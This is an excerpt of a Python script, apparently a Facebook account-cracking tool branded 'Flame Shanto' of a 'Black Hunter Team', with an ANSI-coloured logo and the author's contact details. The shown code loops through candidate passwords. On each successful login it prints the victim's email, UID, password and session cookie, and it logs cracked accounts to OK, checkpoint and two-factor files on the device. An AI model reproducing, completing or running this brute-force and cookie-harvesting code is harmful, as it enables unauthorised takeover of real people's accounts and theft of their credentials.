...
def clear():
    ...
    print(logo)
logo ="""\033[1;32m
\033[1;33m   _____         _   _ _______ ____  
\033[1;34m  / ____|  /\   | \ | |__   __/ __ \ 
\033[1;35m | (___   /  \  |  \| |  | | | |  | |
\033[1;36m  \___ \ / /\ \ | . ` |  | | | |  | |
\033[1;37m  ____) / ____ \| |\  |  | | | |__| |
\033[1;38m |_____/_/    \_\_| \_|  |_|  \____/ 
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
𝐀𝐔𝐓𝐇𝐎𝐑    : 𝐅𝐥𝐚𝐦𝐞 𝐒𝐡𝐚𝐧𝐭𝐨
𝐓𝐄𝐀𝐌   : 𝐁𝐥𝐚𝐜𝐤 𝐇𝐮𝐧𝐭𝐞𝐫 𝐓𝐞𝐚𝐦
𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : 𝐌𝐝 𝐀𝐫𝐢𝐟𝐮𝐥 𝐈𝐬𝐥𝐚𝐦
𝐖𝐡𝐚𝐭'𝐬 𝐀𝐩𝐩   : 𝟎𝟏𝟕𝟕𝟕𝟒𝟑𝟑𝟖𝟕𝟔
𝐕𝐄𝐑𝐒𝐈𝐎𝐍    : 2.0.7
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
                                   [𝐇𝐚𝐭𝐞𝐫𝐬 𝐁𝐞 𝐑𝐞𝐚𝐝𝐲 𝐋𝐞𝐭'𝐬 𝐁𝐞𝐠𝐢𝐧 𝐓𝐡𝐞 𝐆𝐚𝐦𝐞]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                cek_apk(session,coki)
                open('/sdcard/𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ã—]--------------------[𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
                open('/sdcard/𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐅𝐥𝐚𝐦𝐞-𝐒𝐡𝐚𝐧𝐭𝐨] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
